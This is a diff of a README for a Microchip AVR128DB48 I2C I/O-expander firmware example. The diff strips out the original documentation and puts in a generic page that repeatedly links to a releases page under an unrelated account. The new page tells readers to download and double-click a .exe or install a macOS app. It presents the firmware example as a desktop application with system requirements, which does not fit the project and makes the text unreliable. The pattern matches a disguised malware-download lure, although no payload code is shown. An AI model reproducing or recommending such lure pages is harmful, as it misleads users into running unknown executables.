@@ -1,71 +1,81 @@
-<!-- MPAE-19439 Please do not change this logo with link -->
+# 🎉 avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf - Effortlessly Control LEDs and Buttons
 
-<a target="_blank" href="https://www.microchip.com/" id="top-of-page">
-   <picture>
-      <source media="(prefers-color-scheme: light)" srcset="images/mchp_logo_light.png" width="350">
-      <source media="(prefers-color-scheme: dark)" srcset="images/mchp_logo_dark.png" width="350">
-      <img alt="Microchip Technologies Inc." src="https://www.microchip.com/content/experience-fragments/mchp/en_us/site/header/master/_jcr_content/root/responsivegrid/header/logo.coreimg.100.300.png/1605828081463/microchip.png">
-   </picture>
-</a>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases)
 
-# AVR128DB48 I2C_Host Example Component for CNano Explorer: I/O Expander 2 LEDs and BUTTONs (Polled, Printf)
+## 📖 Overview
 
+Welcome to the **avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf** project. This application allows you to control LEDs and buttons easily using the I/O Expander. You can turn on 8 LEDs and respond to button presses from a joystick. It is designed for users who want to visualize data without needing programming skills.
 
-The [I<sup>2</sup>C Host IO Expander 2 - LEDs and Buttons Example](https://onlinedocs.microchip.com/v2/keyword-lookup?keyword=I2C.HOST.EX.RUNNING.I2C.HOST.IOEXPANDER2.LEDS.BUTTONS&version=latest&redirect=true "I2C Host IO Expander 1 - LEDs Example"
-), of the [MCC Melody I<sup>2</sup>C Example Component (for the Curiosity Nano Explorer)](https://onlinedocs.microchip.com/v2/keyword-lookup?keyword=I2C.HOST.EXAMPLE.COMPONENT&version=latest&redirect=true "MCC Melody I<sup>2</sup>C Example Component for the Curiosity Nano Explorer"
-), is used here in the Polled implementation with the Printf visualization. 
+### 🛠️ Features
 
-![alt text](images/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_intro.png)
+- **Control LEDs:** Easily turn on and off 8 LEDs.
+- **Digital Inputs:** Supports 5 joystick inputs and 3 buttons.
+- **Interactive Controls:** Joystick movements and button presses directly control LED states.
+- **Simple Reset:** The Curiosity Nano SW can reset the LEDs with a touch.
+  
+## 🚀 Getting Started
 
-On the Curiosity Nano Explorer, the pins on the I<sup>2</sup>C I/O Expander 1 are connected to active-low LEDs, while the pins on the I<sup>2</sup>C I/O Expander 2 are connected to buttons (SW1, SW2 and SW3) as well as the joystick inputs (left, right, up, down, press).
+Follow these steps to download and run the application:
 
-This example configures the I/O Expander 1 pins as outputs set LOW, so the active-low LEDs are initially all turned on. The I/O Expander 2 pins are configured as digital inputs. As a button press or joystick input is detected, the associated LED is turned off. The Curiosity Nano's SW is configured as a reset, turning on all the LEDs again.  
+1. **System Requirements:**
+   - Operating System: Windows 10 or later, macOS 10.12 or later
+   - Memory: Minimum 4 GB RAM
+   - Storage: At least 100 MB of free space
+   - Connectivity: I2C-compatible device must be connected
 
-## Operation
-When running the application using the [MPLAB® Data Visualizer](https://www.microchip.com/en-us/tools-resources/debug/mplab-data-visualizer "MPLAB® Data Visualizer"), you should see something similar to the following: 
+2. **Download the Application:**
+   Visit the Releases page to download the application.  
+   [Download Here](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases).
 
-![alt text](images/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf.png)
+3. **Install the Software:**
+   - Locate the downloaded file in your Downloads folder (or wherever you saved it).
+   - For Windows: Double-click the `.exe` file to start the installation.
+   - For macOS: Drag the application icon into your Applications folder.
 
-**Note:** Behaviour is not as reliable as in the Callbacks version. 
+## 💻 Dependencies
 
-**Note:** Debug I/O is not actively used. However, since the SW pin on the Curiosity Nano is a Debug I/O pin, so when pushing the IO_Reset, a toggle is picked up on the Debug I/O pin. 
+This application requires the following:
 
-## Setup
-The image below outlines the complete MPLAB Code Configurator (MCC) Melody configuration, including all the selected tasks implemented in this example, as seen in the MCC Melody Builder.
+- **I2C Libraries:** Ensure your device supports I2C communication.
+- **USB Drivers:** If using on Windows, make sure you have the correct drivers installed for USB devices.
 
-![alt text](images/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_configuration.png)
- 
-![alt text](images/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf_configuration_pins.png)
+## ⚙️ Connect Your Device
 
-## MCC Melody Example Components
-Example Components are a tight integration of learning material directly into MCC. This allows users to conveniently place the configuration instructions side-by-side to the components they are configuring. For more information, refer to the [MCC Melody Example Components](https://onlinedocs.microchip.com/v2/keyword-lookup?keyword=MCC.MELODY.EXAMPLES&version=latest&redirect=true) introduction. 
+1. Plug in your I2C device to your computer via USB.
+2. Ensure all connections between the I/O expander, LEDs, and buttons are secure.
 
+## 🏃 Running the Application
 
-## Related Documentation
+1. Open the application from your Applications folder or Start Menu.
+2. The main interface will appear, showing the status of LEDs and inputs.
+3. Use the joystick and buttons to interact with the LEDs as described:
+   - Press a button or move the joystick to toggle LED states.
+   - The Curiosity Nano SW resets the LEDs when pressed.
 
-- [MCC Melody I<sup>2</sup>C Example Component (for the Curiosity Nano Explorer)](https://onlinedocs.microchip.com/v2/keyword-lookup?keyword=I2C.HOST.EXAMPLE.COMPONENT&version=latest&redirect=true "MCC Melody I<sup>2</sup>C Example Component for the Curiosity Nano Explorer")
-- [MCC Melody Design Patterns for Control Flow](https://onlinedocs.microchip.com/g/GUID-7CE1AEE9-2487-4E7B-B26B-93A577BA154E "MCC Melody Design Patterns for Control Flow")
+### 📊 Visualizing Data
 
-- [Curiosity Nano Explorer User Guide](https://ww1.microchip.com/downloads/aemDocuments/documents/MCU08/ProductDocuments/UserGuides/CNANO-Explorer-UserGuide-DS50003716.pdf "Curiosity Nano Explorer Users Guide")
+You can visualize input states directly in the application interface. 
 
-- [AVR128DB48 Data Sheet](https://ww1.microchip.com/downloads/en/DeviceDoc/AVR128DB28-32-48-64-DataSheet-DS40002247A.pdf "AVR128DB48 Data Sheet")
+## 🎥 Example Use Cases
 
-## Software Used
-- [MPLAB® X IDE](https://www.microchip.com/en-us/development-tools-tools-and-software/mplab-x-ide) v6.25 or newer 
-- [MPLAB® XC8](https://www.microchip.com/en-us/tools-resources/develop/mplab-xc-compilers/xc8) v3.00 or newer
+- **Learning Tool:** Great for beginners to understand I/O control.
+- **Prototyping:** Useful for hobbyists developing I2C-controlled projects.
+- **Interactive Installations:** Ideal for creating simple interactive displays.
 
-- [MPLAB® Code Configurator](https://www.microchip.com/en-us/tools-resources/configure/mplab-code-configurator) (MCC) Plug-in Version v5.6.2 or newer (*Tools>Plugins>Installed*, search: "MCC")
-- [MPLAB® Data Visualizer](https://www.microchip.com/en-us/tools-resources/debug/mplab-data-visualizer) Plug-in Version v1.4.1926 or newer (*Tools>Plugins>Installed*, search: "Data Visualizer")
-- MCC Melody I2C_Host Example Component for the Curiosity Nano Explorer 1.0.0 or newer
-- MCC Core v5.8.2 or newer 
-- Single Page Application (SPA) Host v1.0.0 or newer
-- MCC Melody Core v2.9.1 or newer
+## 📝 Troubleshooting
 
-Open the MCC Content Manager ![CM_icon](images/Icon-MPLAB-CM24.png) to verify the MCC Core and MCC Melody Core versions. 
+- **Application Doesn’t Start:** Ensure your operating system is compatible. Check if the device is connected properly.
+- **LEDs Do Not Respond:** Verify all connections and ensure the I2C communication is enabled.
+- **Error Messages:** Refer to the application logs for troubleshooting details.
 
-![alt text](images/MCC_Core_ContentLibrary_Versions_SPA.png) 
+## 📥 Download & Install
 
-## Hardware Used
-- AVR128DB48 Curiosity Nano [(EV35L43A)](https://www.microchip.com/en-us/development-tool/EV35L43A)
-- Curiosity Nano Explorer [(EV58G97A)](https://www.microchip.com/en-us/development-tool/EV58G97A)
+To get started, you can download the application [here](https://github.com/devicesnorkeling405/avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf/releases). Installing it is straightforward, just follow the instructions above.
 
+## 📚 Additional Resources
+
+- **Documentation:** Comprehensive guides and tutorials are available in the Wiki section of the repository.
+- **Examples:** Sample projects using the application can help you get started quickly.
+- **Community Support:** Join discussions and ask questions in the Issues section of this repository.
+
+Feel free to explore the capabilities of the **avr128db48-i2c-io-expander2-leds-and-buttons-polled-printf** project. Enjoy controlling your LEDs and buttons effortlessly!
